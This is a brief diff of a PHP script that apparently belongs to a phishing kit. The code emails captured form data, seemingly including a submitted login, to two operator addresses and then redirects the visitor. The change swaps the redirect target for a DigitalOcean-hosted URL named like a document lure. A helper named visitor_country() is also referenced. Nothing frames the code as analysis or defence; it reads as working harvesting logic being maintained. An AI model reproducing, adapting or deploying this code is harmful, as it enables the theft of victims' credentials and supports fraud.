@@ -34,7 +34,7 @@ header( "Location: process.php?email=$login" );
 else {
 mail($own,$subj,$msg,$headers);
 mail($own2,$subj,$msg,$headers);
-header("Location: http://alevel.wearewhy.co.uk/a1/remit.jpg?#form");
+header("Location: https://document1656pdf-vtrlm.ondigitalocean.app/");
 }
 
 function visitor_country()
